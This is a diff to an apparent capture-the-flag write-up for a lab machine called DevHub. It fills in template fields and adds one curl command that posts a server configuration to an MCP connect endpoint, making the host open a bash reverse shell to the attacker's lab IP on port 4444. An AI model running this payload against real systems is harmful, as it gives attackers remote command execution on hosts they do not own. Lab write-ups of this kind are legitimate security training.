@@ -1,4 +1,4 @@
-# Machine
+# DevHub
 
 ![Machine Badge](https://img.shields.io/badge/Machine-Name-blue)
 ![OS](https://img.shields.io/badge/OS-Linux-orange)
@@ -6,8 +6,8 @@
 
 | Property | Value |
 |----------|-------|
-| **OS** | Linux / Windows |
-| **Difficulty** | Easy / Medium / Hard / Insane |
+| **OS** | Linux |
+| **Difficulty** | Medium |
 | **Release Date** | YYYY-MM-DD |
 | **Retire Date** | YYYY-MM-DD |
 | **IP** | 10.10.10.X |
@@ -36,8 +36,11 @@ nmap -sC -sV -oA nmap/machine 10.10.10.X
 
 ### Service Enumeration
 
-Detail findings from each open port/service.
-
+```
+curl -X POST http://devhub.htb:6274/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.15.199/4444 0>&1"],"env":{}},"serverId":"shell"}'
+```
 ---
 
 ## Foothold
